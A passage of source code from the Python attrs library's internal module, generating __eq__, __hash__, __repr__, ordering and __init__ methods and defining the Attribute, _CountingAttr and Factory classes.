       method_lines.append(indent + "    " + closing_braces)\n\n    if cache_hash:\n        method_lines.append(tab + "if self.%s is None:" % _hash_cache_field)\n        if frozen:\n            append_hash_computation_lines(\n                "object.__setattr__(self, \'%s\', " % _hash_cache_field, tab * 2\n            )\n            method_lines.append(tab * 2 + ")")  # close __setattr__\n        else:\n            append_hash_computation_lines(\n                "self.%s = " % _hash_cache_field, tab * 2\n            )\n        method_lines.append(tab + "return self.%s" % _hash_cache_field)\n    else:\n        append_hash_computation_lines("return ", tab)\n\n    script = "\\n".join(method_lines)\n    return _make_method("__hash__", script, unique_filename)\n\n\ndef _add_hash(cls, attrs):\n    """\n    Add a hash method to *cls*.\n    """\n    cls.__hash__ = _make_hash(cls, attrs, frozen=False, cache_hash=False)\n    return cls\n\n\ndef _make_ne():\n    """\n    Create __ne__ method.\n    """\n\n    def __ne__(self, other):\n        """\n        Check equality and either forward a NotImplemented or\n        return the result negated.\n        """\n        result = self.__eq__(other)\n        if result is NotImplemented:\n            return NotImplemented\n\n        return not result\n\n    return __ne__\n\n\ndef _make_eq(cls, attrs):\n    """\n    Create __eq__ method for *cls* with *attrs*.\n    """\n    attrs = [a for a in attrs if a.eq]\n\n    unique_filename = _generate_unique_filename(cls, "eq")\n    lines = [\n        "def __eq__(self, other):",\n        "    if other.__class__ is not self.__class__:",\n        "        return NotImplemented",\n    ]\n\n    # We can\'t just do a big self.x = other.x and... clause due to\n    # irregularities like nan == nan is false but (nan,) == (nan,) is true.\n    globs = {}\n    if attrs:\n        lines.append("    return  (")\n        others = ["    ) == ("]\n        for a in attrs:\n            if a.eq_key:\n                cmp_name = "_%s_key" % (a.name,)\n                # Add the key function to the global namespace\n                # of the evaluated function.\n                globs[cmp_name] = a.eq_key\n                lines.append(\n                    "        %s(self.%s),"\n                    % (\n                        cmp_name,\n                        a.name,\n                    )\n                )\n                others.append(\n                    "        %s(other.%s),"\n                    % (\n                        cmp_name,\n                        a.name,\n                    )\n                )\n            else:\n                lines.append("        self.%s," % (a.name,))\n                others.append("        other.%s," % (a.name,))\n\n        lines += others + ["    )"]\n    else:\n        lines.append("    return True")\n\n    script = "\\n".join(lines)\n\n    return _make_method("__eq__", script, unique_filename, globs)\n\n\ndef _make_order(cls, attrs):\n    """\n    Create ordering methods for *cls* with *attrs*.\n    """\n    attrs = [a for a in attrs if a.order]\n\n    def attrs_to_tuple(obj):\n        """\n        Save us some typing.\n        """\n        return tuple(\n            key(value) if key else value\n            for value, key in (\n                (getattr(obj, a.name), a.order_key) for a in attrs\n            )\n        )\n\n    def __lt__(self, other):\n        """\n        Automatically created by attrs.\n        """\n        if other.__class__ is self.__class__:\n            return attrs_to_tuple(self) < attrs_to_tuple(other)\n\n        return NotImplemented\n\n    def __le__(self, other):\n        """\n        Automatically created by attrs.\n        """\n        if other.__class__ is self.__class__:\n            return attrs_to_tuple(self) <= attrs_to_tuple(other)\n\n        return NotImplemented\n\n    def __gt__(self, other):\n        """\n        Automatically created by attrs.\n        """\n        if other.__class__ is self.__class__:\n            return attrs_to_tuple(self) > attrs_to_tuple(other)\n\n        return NotImplemented\n\n    def __ge__(self, other):\n        """\n        Automatically created by attrs.\n        """\n        if other.__class__ is self.__class__:\n            return attrs_to_tuple(self) >= attrs_to_tuple(other)\n\n        return NotImplemented\n\n    return __lt__, __le__, __gt__, __ge__\n\n\ndef _add_eq(cls, attrs=None):\n    """\n    Add equality methods to *cls* with *attrs*.\n    """\n    if attrs is None:\n        attrs = cls.__attrs_attrs__\n\n    cls.__eq__ = _make_eq(cls, attrs)\n    cls.__ne__ = _make_ne()\n\n    return cls\n\n\nif HAS_F_STRINGS:\n\n    def _make_repr(attrs, ns, cls):\n        unique_filename = _generate_unique_filename(cls, "repr")\n        # Figure out which attributes to include, and which function to use to\n        # format them. The a.repr value can be either bool or a custom\n        # callable.\n        attr_names_with_reprs = tuple(\n            (a.name, (repr if a.repr is True else a.repr), a.init)\n            for a in attrs\n            if a.repr is not False\n        )\n        globs = {\n            name + "_repr": r\n            for name, r, _ in attr_names_with_reprs\n            if r != repr\n        }\n        globs["_compat"] = _compat\n        globs["AttributeError"] = AttributeError\n        globs["NOTHING"] = NOTHING\n        attribute_fragments = []\n        for name, r, i in attr_names_with_reprs:\n            accessor = (\n                "self." + name\n                if i\n                else \'getattr(self, "\' + name + \'", NOTHING)\'\n            )\n            fragment = (\n                "%s={%s!r}" % (name, accessor)\n                if r == repr\n                else "%s={%s_repr(%s)}" % (name, name, accessor)\n            )\n            attribute_fragments.append(fragment)\n        repr_fragment = ", ".join(attribute_fragments)\n\n        if ns is None:\n            cls_name_fragment = (\n                \'{self.__class__.__qualname__.rsplit(">.", 1)[-1]}\'\n            )\n        else:\n            cls_name_fragment = ns + ".{self.__class__.__name__}"\n\n        lines = [\n            "def __repr__(self):",\n            "  try:",\n            "    already_repring = _compat.repr_context.already_repring",\n            "  except AttributeError:",\n            "    already_repring = {id(self),}",\n            "    _compat.repr_context.already_repring = already_repring",\n            "  else:",\n            "    if id(self) in already_repring:",\n            "      return \'...\'",\n            "    else:",\n            "      already_repring.add(id(self))",\n            "  try:",\n            "    return f\'%s(%s)\'" % (cls_name_fragment, repr_fragment),\n            "  finally:",\n            "    already_repring.remove(id(self))",\n        ]\n\n        return _make_method(\n            "__repr__", "\\n".join(lines), unique_filename, globs=globs\n        )\n\nelse:\n\n    def _make_repr(attrs, ns, _):\n        """\n        Make a repr method that includes relevant *attrs*, adding *ns* to the\n        full name.\n        """\n\n        # Figure out which attributes to include, and which function to use to\n        # format them. The a.repr value can be either bool or a custom\n        # callable.\n        attr_names_with_reprs = tuple(\n            (a.name, repr if a.repr is True else a.repr)\n            for a in attrs\n            if a.repr is not False\n        )\n\n        def __repr__(self):\n            """\n            Automatically created by attrs.\n            """\n            try:\n                already_repring = _compat.repr_context.already_repring\n            except AttributeError:\n                already_repring = set()\n                _compat.repr_context.already_repring = already_repring\n\n            if id(self) in already_repring:\n                return "..."\n            real_cls = self.__class__\n            if ns is None:\n                qualname = getattr(real_cls, "__qualname__", None)\n                if qualname is not None:  # pragma: no cover\n                    # This case only happens on Python 3.5 and 3.6. We exclude\n                    # it from coverage, because we don\'t want to slow down our\n                    # test suite by running them under coverage too for this\n                    # one line.\n                    class_name = qualname.rsplit(">.", 1)[-1]\n                else:\n                    class_name = real_cls.__name__\n            else:\n                class_name = ns + "." + real_cls.__name__\n\n            # Since \'self\' remains on the stack (i.e.: strongly referenced)\n            # for the duration of this call, it\'s safe to depend on id(...)\n            # stability, and not need to track the instance and therefore\n            # worry about properties like weakref- or hash-ability.\n            already_repring.add(id(self))\n            try:\n                result = [class_name, "("]\n                first = True\n                for name, attr_repr in attr_names_with_reprs:\n                    if first:\n                        first = False\n                    else:\n                        result.append(", ")\n                    result.extend(\n                        (name, "=", attr_repr(getattr(self, name, NOTHING)))\n                    )\n                return "".join(result) + ")"\n            finally:\n                already_repring.remove(id(self))\n\n        return __repr__\n\n\ndef _add_repr(cls, ns=None, attrs=None):\n    """\n    Add a repr method to *cls*.\n    """\n    if attrs is None:\n        attrs = cls.__attrs_attrs__\n\n    cls.__repr__ = _make_repr(attrs, ns, cls)\n    return cls\n\n\ndef fields(cls):\n    """\n    Return the tuple of ``attrs`` attributes for a class.\n\n    The tuple also allows accessing the fields by their names (see below for\n    examples).\n\n    :param type cls: Class to introspect.\n\n    :raise TypeError: If *cls* is not a class.\n    :raise attr.exceptions.NotAnAttrsClassError: If *cls* is not an ``attrs``\n        class.\n\n    :rtype: tuple (with name accessors) of `attrs.Attribute`\n\n    ..  versionchanged:: 16.2.0 Returned tuple allows accessing the fields\n        by name.\n    """\n    if not isclass(cls):\n        raise TypeError("Passed object must be a class.")\n    attrs = getattr(cls, "__attrs_attrs__", None)\n    if attrs is None:\n        raise NotAnAttrsClassError(\n            "{cls!r} is not an attrs-decorated class.".format(cls=cls)\n        )\n    return attrs\n\n\ndef fields_dict(cls):\n    """\n    Return an ordered dictionary of ``attrs`` attributes for a class, whose\n    keys are the attribute names.\n\n    :param type cls: Class to introspect.\n\n    :raise TypeError: If *cls* is not a class.\n    :raise attr.exceptions.NotAnAttrsClassError: If *cls* is not an ``attrs``\n        class.\n\n    :rtype: an ordered dict where keys are attribute names and values are\n        `attrs.Attribute`\\\\ s. This will be a `dict` if it\'s\n        naturally ordered like on Python 3.6+ or an\n        :class:`~collections.OrderedDict` otherwise.\n\n    .. versionadded:: 18.1.0\n    """\n    if not isclass(cls):\n        raise TypeError("Passed object must be a class.")\n    attrs = getattr(cls, "__attrs_attrs__", None)\n    if attrs is None:\n        raise NotAnAttrsClassError(\n            "{cls!r} is not an attrs-decorated class.".format(cls=cls)\n        )\n    return ordered_dict(((a.name, a) for a in attrs))\n\n\ndef validate(inst):\n    """\n    Validate all attributes on *inst* that have a validator.\n\n    Leaves all exceptions through.\n\n    :param inst: Instance of a class with ``attrs`` attributes.\n    """\n    if _config._run_validators is False:\n        return\n\n    for a in fields(inst.__class__):\n        v = a.validator\n        if v is not None:\n            v(inst, a, getattr(inst, a.name))\n\n\ndef _is_slot_cls(cls):\n    return "__slots__" in cls.__dict__\n\n\ndef _is_slot_attr(a_name, base_attr_map):\n    """\n    Check if the attribute name comes from a slot class.\n    """\n    return a_name in base_attr_map and _is_slot_cls(base_attr_map[a_name])\n\n\ndef _make_init(\n    cls,\n    attrs,\n    pre_init,\n    post_init,\n    frozen,\n    slots,\n    cache_hash,\n    base_attr_map,\n    is_exc,\n    cls_on_setattr,\n    attrs_init,\n):\n    has_cls_on_setattr = (\n        cls_on_setattr is not None and cls_on_setattr is not setters.NO_OP\n    )\n\n    if frozen and has_cls_on_setattr:\n        raise ValueError("Frozen classes can\'t use on_setattr.")\n\n    needs_cached_setattr = cache_hash or frozen\n    filtered_attrs = []\n    attr_dict = {}\n    for a in attrs:\n        if not a.init and a.default is NOTHING:\n            continue\n\n        filtered_attrs.append(a)\n        attr_dict[a.name] = a\n\n        if a.on_setattr is not None:\n            if frozen is True:\n                raise ValueError("Frozen classes can\'t use on_setattr.")\n\n            needs_cached_setattr = True\n        elif has_cls_on_setattr and a.on_setattr is not setters.NO_OP:\n            needs_cached_setattr = True\n\n    unique_filename = _generate_unique_filename(cls, "init")\n\n    script, globs, annotations = _attrs_to_init_script(\n        filtered_attrs,\n        frozen,\n        slots,\n        pre_init,\n        post_init,\n        cache_hash,\n        base_attr_map,\n        is_exc,\n        needs_cached_setattr,\n        has_cls_on_setattr,\n        attrs_init,\n    )\n    if cls.__module__ in sys.modules:\n        # This makes typing.get_type_hints(CLS.__init__) resolve string types.\n        globs.update(sys.modules[cls.__module__].__dict__)\n\n    globs.update({"NOTHING": NOTHING, "attr_dict": attr_dict})\n\n    if needs_cached_setattr:\n        # Save the lookup overhead in __init__ if we need to circumvent\n        # setattr hooks.\n        globs["_cached_setattr"] = _obj_setattr\n\n    init = _make_method(\n        "__attrs_init__" if attrs_init else "__init__",\n        script,\n        unique_filename,\n        globs,\n    )\n    init.__annotations__ = annotations\n\n    return init\n\n\ndef _setattr(attr_name, value_var, has_on_setattr):\n    """\n    Use the cached object.setattr to set *attr_name* to *value_var*.\n    """\n    return "_setattr(\'%s\', %s)" % (attr_name, value_var)\n\n\ndef _setattr_with_converter(attr_name, value_var, has_on_setattr):\n    """\n    Use the cached object.setattr to set *attr_name* to *value_var*, but run\n    its converter first.\n    """\n    return "_setattr(\'%s\', %s(%s))" % (\n        attr_name,\n        _init_converter_pat % (attr_name,),\n        value_var,\n    )\n\n\ndef _assign(attr_name, value, has_on_setattr):\n    """\n    Unless *attr_name* has an on_setattr hook, use normal assignment. Otherwise\n    relegate to _setattr.\n    """\n    if has_on_setattr:\n        return _setattr(attr_name, value, True)\n\n    return "self.%s = %s" % (attr_name, value)\n\n\ndef _assign_with_converter(attr_name, value_var, has_on_setattr):\n    """\n    Unless *attr_name* has an on_setattr hook, use normal assignment after\n    conversion. Otherwise relegate to _setattr_with_converter.\n    """\n    if has_on_setattr:\n        return _setattr_with_converter(attr_name, value_var, True)\n\n    return "self.%s = %s(%s)" % (\n        attr_name,\n        _init_converter_pat % (attr_name,),\n        value_var,\n    )\n\n\nif PY2:\n\n    def _unpack_kw_only_py2(attr_name, default=None):\n        """\n        Unpack *attr_name* from _kw_only dict.\n        """\n        if default is not None:\n            arg_default = ", %s" % default\n        else:\n            arg_default = ""\n        return "%s = _kw_only.pop(\'%s\'%s)" % (\n            attr_name,\n            attr_name,\n            arg_default,\n        )\n\n    def _unpack_kw_only_lines_py2(kw_only_args):\n        """\n        Unpack all *kw_only_args* from _kw_only dict and handle errors.\n\n        Given a list of strings "{attr_name}" and "{attr_name}={default}"\n        generates list of lines of code that pop attrs from _kw_only dict and\n        raise TypeError similar to builtin if required attr is missing or\n        extra key is passed.\n\n        >>> print("\\n".join(_unpack_kw_only_lines_py2(["a", "b=42"])))\n        try:\n            a = _kw_only.pop(\'a\')\n            b = _kw_only.pop(\'b\', 42)\n        except KeyError as _key_error:\n            raise TypeError(\n                ...\n        if _kw_only:\n            raise TypeError(\n                ...\n        """\n        lines = ["try:"]\n        lines.extend(\n            "    " + _unpack_kw_only_py2(*arg.split("="))\n            for arg in kw_only_args\n        )\n        lines += """\\\nexcept KeyError as _key_error:\n    raise TypeError(\n        \'__init__() missing required keyword-only argument: %s\' % _key_error\n    )\nif _kw_only:\n    raise TypeError(\n        \'__init__() got an unexpected keyword argument %r\'\n        % next(iter(_kw_only))\n    )\n""".split(\n            "\\n"\n        )\n        return lines\n\n\ndef _attrs_to_init_script(\n    attrs,\n    frozen,\n    slots,\n    pre_init,\n    post_init,\n    cache_hash,\n    base_attr_map,\n    is_exc,\n    needs_cached_setattr,\n    has_cls_on_setattr,\n    attrs_init,\n):\n    """\n    Return a script of an initializer for *attrs* and a dict of globals.\n\n    The globals are expected by the generated script.\n\n    If *frozen* is True, we cannot set the attributes directly so we use\n    a cached ``object.__setattr__``.\n    """\n    lines = []\n    if pre_init:\n        lines.append("self.__attrs_pre_init__()")\n\n    if needs_cached_setattr:\n        lines.append(\n            # Circumvent the __setattr__ descriptor to save one lookup per\n            # assignment.\n            # Note _setattr will be used again below if cache_hash is True\n            "_setattr = _cached_setattr.__get__(self, self.__class__)"\n        )\n\n    if frozen is True:\n        if slots is True:\n            fmt_setter = _setattr\n            fmt_setter_with_converter = _setattr_with_converter\n        else:\n            # Dict frozen classes assign directly to __dict__.\n            # But only if the attribute doesn\'t come from an ancestor slot\n            # class.\n            # Note _inst_dict will be used again below if cache_hash is True\n            lines.append("_inst_dict = self.__dict__")\n\n            def fmt_setter(attr_name, value_var, has_on_setattr):\n                if _is_slot_attr(attr_name, base_attr_map):\n                    return _setattr(attr_name, value_var, has_on_setattr)\n\n                return "_inst_dict[\'%s\'] = %s" % (attr_name, value_var)\n\n            def fmt_setter_with_converter(\n                attr_name, value_var, has_on_setattr\n            ):\n                if has_on_setattr or _is_slot_attr(attr_name, base_attr_map):\n                    return _setattr_with_converter(\n                        attr_name, value_var, has_on_setattr\n                    )\n\n                return "_inst_dict[\'%s\'] = %s(%s)" % (\n                    attr_name,\n                    _init_converter_pat % (attr_name,),\n                    value_var,\n                )\n\n    else:\n        # Not frozen.\n        fmt_setter = _assign\n        fmt_setter_with_converter = _assign_with_converter\n\n    args = []\n    kw_only_args = []\n    attrs_to_validate = []\n\n    # This is a dictionary of names to validator and converter callables.\n    # Injecting this into __init__ globals lets us avoid lookups.\n    names_for_globals = {}\n    annotations = {"return": None}\n\n    for a in attrs:\n        if a.validator:\n            attrs_to_validate.append(a)\n\n        attr_name = a.name\n        has_on_setattr = a.on_setattr is not None or (\n            a.on_setattr is not setters.NO_OP and has_cls_on_setattr\n        )\n        arg_name = a.name.lstrip("_")\n\n        has_factory = isinstance(a.default, Factory)\n        if has_factory and a.default.takes_self:\n            maybe_self = "self"\n        else:\n            maybe_self = ""\n\n        if a.init is False:\n            if has_factory:\n                init_factory_name = _init_factory_pat.format(a.name)\n                if a.converter is not None:\n                    lines.append(\n                        fmt_setter_with_converter(\n                            attr_name,\n                            init_factory_name + "(%s)" % (maybe_self,),\n                            has_on_setattr,\n                        )\n                    )\n                    conv_name = _init_converter_pat % (a.name,)\n                    names_for_globals[conv_name] = a.converter\n                else:\n                    lines.append(\n                        fmt_setter(\n                            attr_name,\n                            init_factory_name + "(%s)" % (maybe_self,),\n                            has_on_setattr,\n                        )\n                    )\n                names_for_globals[init_factory_name] = a.default.factory\n            else:\n                if a.converter is not None:\n                    lines.append(\n                        fmt_setter_with_converter(\n                            attr_name,\n                            "attr_dict[\'%s\'].default" % (attr_name,),\n                            has_on_setattr,\n                        )\n                    )\n                    conv_name = _init_converter_pat % (a.name,)\n                    names_for_globals[conv_name] = a.converter\n                else:\n                    lines.append(\n                        fmt_setter(\n                            attr_name,\n                            "attr_dict[\'%s\'].default" % (attr_name,),\n                            has_on_setattr,\n                        )\n                    )\n        elif a.default is not NOTHING and not has_factory:\n            arg = "%s=attr_dict[\'%s\'].default" % (arg_name, attr_name)\n            if a.kw_only:\n                kw_only_args.append(arg)\n            else:\n                args.append(arg)\n\n            if a.converter is not None:\n                lines.append(\n                    fmt_setter_with_converter(\n                        attr_name, arg_name, has_on_setattr\n                    )\n                )\n                names_for_globals[\n                    _init_converter_pat % (a.name,)\n                ] = a.converter\n            else:\n                lines.append(fmt_setter(attr_name, arg_name, has_on_setattr))\n\n        elif has_factory:\n            arg = "%s=NOTHING" % (arg_name,)\n            if a.kw_only:\n                kw_only_args.append(arg)\n            else:\n                args.append(arg)\n            lines.append("if %s is not NOTHING:" % (arg_name,))\n\n            init_factory_name = _init_factory_pat.format(a.name)\n            if a.converter is not None:\n                lines.append(\n                    "    "\n                    + fmt_setter_with_converter(\n                        attr_name, arg_name, has_on_setattr\n                    )\n                )\n                lines.append("else:")\n                lines.append(\n                    "    "\n                    + fmt_setter_with_converter(\n                        attr_name,\n                        init_factory_name + "(" + maybe_self + ")",\n                        has_on_setattr,\n                    )\n                )\n                names_for_globals[\n                    _init_converter_pat % (a.name,)\n                ] = a.converter\n            else:\n                lines.append(\n                    "    " + fmt_setter(attr_name, arg_name, has_on_setattr)\n                )\n                lines.append("else:")\n                lines.append(\n                    "    "\n                    + fmt_setter(\n                        attr_name,\n                        init_factory_name + "(" + maybe_self + ")",\n                        has_on_setattr,\n                    )\n                )\n            names_for_globals[init_factory_name] = a.default.factory\n        else:\n            if a.kw_only:\n                kw_only_args.append(arg_name)\n            else:\n                args.append(arg_name)\n\n            if a.converter is not None:\n                lines.append(\n                    fmt_setter_with_converter(\n                        attr_name, arg_name, has_on_setattr\n                    )\n                )\n                names_for_globals[\n                    _init_converter_pat % (a.name,)\n                ] = a.converter\n            else:\n                lines.append(fmt_setter(attr_name, arg_name, has_on_setattr))\n\n        if a.init is True:\n            if a.type is not None and a.converter is None:\n                annotations[arg_name] = a.type\n            elif a.converter is not None and not PY2:\n                # Try to get the type from the converter.\n                sig = None\n                try:\n                    sig = inspect.signature(a.converter)\n                except (ValueError, TypeError):  # inspect failed\n                    pass\n                if sig:\n                    sig_params = list(sig.parameters.values())\n                    if (\n                        sig_params\n                        and sig_params[0].annotation\n                        is not inspect.Parameter.empty\n                    ):\n                        annotations[arg_name] = sig_params[0].annotation\n\n    if attrs_to_validate:  # we can skip this if there are no validators.\n        names_for_globals["_config"] = _config\n        lines.append("if _config._run_validators is True:")\n        for a in attrs_to_validate:\n            val_name = "__attr_validator_" + a.name\n            attr_name = "__attr_" + a.name\n            lines.append(\n                "    %s(self, %s, self.%s)" % (val_name, attr_name, a.name)\n            )\n            names_for_globals[val_name] = a.validator\n            names_for_globals[attr_name] = a\n\n    if post_init:\n        lines.append("self.__attrs_post_init__()")\n\n    # because this is set only after __attrs_post_init is called, a crash\n    # will result if post-init tries to access the hash code.  This seemed\n    # preferable to setting this beforehand, in which case alteration to\n    # field values during post-init combined with post-init accessing the\n    # hash code would result in silent bugs.\n    if cache_hash:\n        if frozen:\n            if slots:\n                # if frozen and slots, then _setattr defined above\n                init_hash_cache = "_setattr(\'%s\', %s)"\n            else:\n                # if frozen and not slots, then _inst_dict defined above\n                init_hash_cache = "_inst_dict[\'%s\'] = %s"\n        else:\n            init_hash_cache = "self.%s = %s"\n        lines.append(init_hash_cache % (_hash_cache_field, "None"))\n\n    # For exceptions we rely on BaseException.__init__ for proper\n    # initialization.\n    if is_exc:\n        vals = ",".join("self." + a.name for a in attrs if a.init)\n\n        lines.append("BaseException.__init__(self, %s)" % (vals,))\n\n    args = ", ".join(args)\n    if kw_only_args:\n        if PY2:\n            lines = _unpack_kw_only_lines_py2(kw_only_args) + lines\n\n            args += "%s**_kw_only" % (", " if args else "",)  # leading comma\n        else:\n            args += "%s*, %s" % (\n                ", " if args else "",  # leading comma\n                ", ".join(kw_only_args),  # kw_only args\n            )\n    return (\n        """\\\ndef {init_name}(self, {args}):\n    {lines}\n""".format(\n            init_name=("__attrs_init__" if attrs_init else "__init__"),\n            args=args,\n            lines="\\n    ".join(lines) if lines else "pass",\n        ),\n        names_for_globals,\n        annotations,\n    )\n\n\nclass Attribute(object):\n    """\n    *Read-only* representation of an attribute.\n\n    The class has *all* arguments of `attr.ib` (except for ``factory``\n    which is only syntactic sugar for ``default=Factory(...)`` plus the\n    following:\n\n    - ``name`` (`str`): The name of the attribute.\n    - ``inherited`` (`bool`): Whether or not that attribute has been inherited\n      from a base class.\n    - ``eq_key`` and ``order_key`` (`typing.Callable` or `None`): The callables\n      that are used for comparing and ordering objects by this attribute,\n      respectively. These are set by passing a callable to `attr.ib`\'s ``eq``,\n      ``order``, or ``cmp`` arguments. See also :ref:`comparison customization\n      <custom-comparison>`.\n\n    Instances of this class are frequently used for introspection purposes\n    like:\n\n    - `fields` returns a tuple of them.\n    - Validators get them passed as the first argument.\n    - The :ref:`field transformer <transform-fields>` hook receives a list of\n      them.\n\n    .. versionadded:: 20.1.0 *inherited*\n    .. versionadded:: 20.1.0 *on_setattr*\n    .. versionchanged:: 20.2.0 *inherited* is not taken into account for\n        equality checks and hashing anymore.\n    .. versionadded:: 21.1.0 *eq_key* and *order_key*\n\n    For the full version history of the fields, see `attr.ib`.\n    """\n\n    __slots__ = (\n        "name",\n        "default",\n        "validator",\n        "repr",\n        "eq",\n        "eq_key",\n        "order",\n        "order_key",\n        "hash",\n        "init",\n        "metadata",\n        "type",\n        "converter",\n        "kw_only",\n        "inherited",\n        "on_setattr",\n    )\n\n    def __init__(\n        self,\n        name,\n        default,\n        validator,\n        repr,\n        cmp,  # XXX: unused, remove along with other cmp code.\n        hash,\n        init,\n        inherited,\n        metadata=None,\n        type=None,\n        converter=None,\n        kw_only=False,\n        eq=None,\n        eq_key=None,\n        order=None,\n        order_key=None,\n        on_setattr=None,\n    ):\n        eq, eq_key, order, order_key = _determine_attrib_eq_order(\n            cmp, eq_key or eq, order_key or order, True\n        )\n\n        # Cache this descriptor here to speed things up later.\n        bound_setattr = _obj_setattr.__get__(self, Attribute)\n\n        # Despite the big red warning, people *do* instantiate `Attribute`\n        # themselves.\n        bound_setattr("name", name)\n        bound_setattr("default", default)\n        bound_setattr("validator", validator)\n        bound_setattr("repr", repr)\n        bound_setattr("eq", eq)\n        bound_setattr("eq_key", eq_key)\n        bound_setattr("order", order)\n        bound_setattr("order_key", order_key)\n        bound_setattr("hash", hash)\n        bound_setattr("init", init)\n        bound_setattr("converter", converter)\n        bound_setattr(\n            "metadata",\n            (\n                metadata_proxy(metadata)\n                if metadata\n                else _empty_metadata_singleton\n            ),\n        )\n        bound_setattr("type", type)\n        bound_setattr("kw_only", kw_only)\n        bound_setattr("inherited", inherited)\n        bound_setattr("on_setattr", on_setattr)\n\n    def __setattr__(self, name, value):\n        raise FrozenInstanceError()\n\n    @classmethod\n    def from_counting_attr(cls, name, ca, type=None):\n        # type holds the annotated value. deal with conflicts:\n        if type is None:\n            type = ca.type\n        elif ca.type is not None:\n            raise ValueError(\n                "Type annotation and type argument cannot both be present"\n            )\n        inst_dict = {\n            k: getattr(ca, k)\n            for k in Attribute.__slots__\n            if k\n            not in (\n                "name",\n                "validator",\n                "default",\n                "type",\n                "inherited",\n            )  # exclude methods and deprecated alias\n        }\n        return cls(\n            name=name,\n            validator=ca._validator,\n            default=ca._default,\n            type=type,\n            cmp=None,\n            inherited=False,\n            **inst_dict\n        )\n\n    @property\n    def cmp(self):\n        """\n        Simulate the presence of a cmp attribute and warn.\n        """\n        warnings.warn(_CMP_DEPRECATION, DeprecationWarning, stacklevel=2)\n\n        return self.eq and self.order\n\n    # Don\'t use attr.evolve since fields(Attribute) doesn\'t work\n    def evolve(self, **changes):\n        """\n        Copy *self* and apply *changes*.\n\n        This works similarly to `attr.evolve` but that function does not work\n        with ``Attribute``.\n\n        It is mainly meant to be used for `transform-fields`.\n\n        .. versionadded:: 20.3.0\n        """\n        new = copy.copy(self)\n\n        new._setattrs(changes.items())\n\n        return new\n\n    # Don\'t use _add_pickle since fields(Attribute) doesn\'t work\n    def __getstate__(self):\n        """\n        Play nice with pickle.\n        """\n        return tuple(\n            getattr(self, name) if name != "metadata" else dict(self.metadata)\n            for name in self.__slots__\n        )\n\n    def __setstate__(self, state):\n        """\n        Play nice with pickle.\n        """\n        self._setattrs(zip(self.__slots__, state))\n\n    def _setattrs(self, name_values_pairs):\n        bound_setattr = _obj_setattr.__get__(self, Attribute)\n        for name, value in name_values_pairs:\n            if name != "metadata":\n                bound_setattr(name, value)\n            else:\n                bound_setattr(\n                    name,\n                    metadata_proxy(value)\n                    if value\n                    else _empty_metadata_singleton,\n                )\n\n\n_a = [\n    Attribute(\n        name=name,\n        default=NOTHING,\n        validator=None,\n        repr=True,\n        cmp=None,\n        eq=True,\n        order=False,\n        hash=(name != "metadata"),\n        init=True,\n        inherited=False,\n    )\n    for name in Attribute.__slots__\n]\n\nAttribute = _add_hash(\n    _add_eq(\n        _add_repr(Attribute, attrs=_a),\n        attrs=[a for a in _a if a.name != "inherited"],\n    ),\n    attrs=[a for a in _a if a.hash and a.name != "inherited"],\n)\n\n\nclass _CountingAttr(object):\n    """\n    Intermediate representation of attributes that uses a counter to preserve\n    the order in which the attributes have been defined.\n\n    *Internal* data structure of the attrs library.  Running into is most\n    likely the result of a bug like a forgotten `@attr.s` decorator.\n    """\n\n    __slots__ = (\n        "counter",\n        "_default",\n        "repr",\n        "eq",\n        "eq_key",\n        "order",\n        "order_key",\n        "hash",\n        "init",\n        "metadata",\n        "_validator",\n        "converter",\n        "type",\n        "kw_only",\n        "on_setattr",\n    )\n    __attrs_attrs__ = tuple(\n        Attribute(\n            name=name,\n            default=NOTHING,\n            validator=None,\n            repr=True,\n            cmp=None,\n            hash=True,\n            init=True,\n            kw_only=False,\n            eq=True,\n            eq_key=None,\n            order=False,\n            order_key=None,\n            inherited=False,\n            on_setattr=None,\n        )\n        for name in (\n            "counter",\n            "_default",\n            "repr",\n            "eq",\n            "order",\n            "hash",\n            "init",\n            "on_setattr",\n        )\n    ) + (\n        Attribute(\n            name="metadata",\n            default=None,\n            validator=None,\n            repr=True,\n            cmp=None,\n            hash=False,\n            init=True,\n            kw_only=False,\n            eq=True,\n            eq_key=None,\n            order=False,\n            order_key=None,\n            inherited=False,\n            on_setattr=None,\n        ),\n    )\n    cls_counter = 0\n\n    def __init__(\n        self,\n        default,\n        validator,\n        repr,\n        cmp,\n        hash,\n        init,\n        converter,\n        metadata,\n        type,\n        kw_only,\n        eq,\n        eq_key,\n        order,\n        order_key,\n        on_setattr,\n    ):\n        _CountingAttr.cls_counter += 1\n        self.counter = _CountingAttr.cls_counter\n        self._default = default\n        self._validator = validator\n        self.converter = converter\n        self.repr = repr\n        self.eq = eq\n        self.eq_key = eq_key\n        self.order = order\n        self.order_key = order_key\n        self.hash = hash\n        self.init = init\n        self.metadata = metadata\n        self.type = type\n        self.kw_only = kw_only\n        self.on_setattr = on_setattr\n\n    def validator(self, meth):\n        """\n        Decorator that adds *meth* to the list of validators.\n\n        Returns *meth* unchanged.\n\n        .. versionadded:: 17.1.0\n        """\n        if self._validator is None:\n            self._validator = meth\n        else:\n            self._validator = and_(self._validator, meth)\n        return meth\n\n    def default(self, meth):\n        """\n        Decorator that allows to set the default for an attribute.\n\n        Returns *meth* unchanged.\n\n        :raises DefaultAlreadySetError: If default has been set before.\n\n        .. versionadded:: 17.1.0\n        """\n        if self._default is not NOTHING:\n            raise DefaultAlreadySetError()\n\n        self._default = Factory(meth, takes_self=True)\n\n        return meth\n\n\n_CountingAttr = _add_eq(_add_repr(_CountingAttr))\n\n\nclass Factory(object):\n    """\n    Stores a factory callable.\n\n    If passed as the default value to `attrs.field`, the factory is used to\n    generate a new value.\n\n    :param callable factory: A callable that takes either none or exactly one\n        mandatory positional argument depending on *takes_self*.\n    :param bool takes_self: Pass the partially initialized instance that is\n        being initialized as a positional argument.\n\n    .. versionadded:: 17.1.0  *takes_self*\n    """\n\n    __slots__ = ("factory", "takes_self")\n\n    def __init__(self, factory, takes_self=False):\n        """\n        `Factory` is part of the default machinery so if we want a default\n        value here, we have to implement it ourselves.\n        """\n        self.factory = factory\n        self.takes_self = takes_self\n\n    def __getstate__(self):\n        """\n        Play nice with pickle.\n        """\n        return tuple(getattr(self, name) for name in self.__slots__)\n\n    def __setstate__(self, state):\n        """\n        Play nice with pickle.\n        """\n        for name, value in zip(self.__slots__, state):\n            setattr(self, name, value)\n\n\n_f = [\n    Attribute(\n        name=name,\n        default=NOTHING,\n        validator=None,\n        repr=True,\n        cmp=None,\n        eq=True,\n        order=False,\n        hash=True,\n        init=True,\n        inherited=False,\n    )\n    for name in Factory.__slots__\n]\n\nFactory = _add_hash(_add_eq(_add_repr(Factory, attrs=_f), attrs=_f), 